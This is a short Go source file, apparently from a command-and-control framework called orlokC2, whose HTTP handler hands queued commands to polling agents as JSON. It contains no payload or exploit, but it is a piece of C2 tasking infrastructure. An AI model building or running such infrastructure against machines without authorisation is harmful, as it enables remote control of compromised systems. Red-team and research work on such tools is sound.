package router

import (
	"encoding/json"
	"github.com/faanross/orlokC2/internal/middleware"
	"github.com/faanross/orlokC2/internal/websocket"
	"log"
	"net/http"
)

func CommandHandler(w http.ResponseWriter, r *http.Request) {

	agentUUID, _ := r.Context().Value(middleware.AgentUUIDKey).(string)

	log.Printf("Endpoint %s has been hit by agent %s: \n", r.URL.Path, agentUUID)

	// Check if a new command exists
	cmd, exists := websocket.AgentCommands.GetCommand()

	// Prepare response struct
	response := struct {
		Command    string `json:"command,omitempty"`
		HasCommand bool   `json:"has_command"`
	}{
		HasCommand: exists,
	}

	// add cmd if it exists
	if exists {
		response.Command = cmd
		log.Printf("Found command: %s\n", cmd)
	} else {
		log.Println("No command found")
	}

	// send reponse as JSON
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)

}
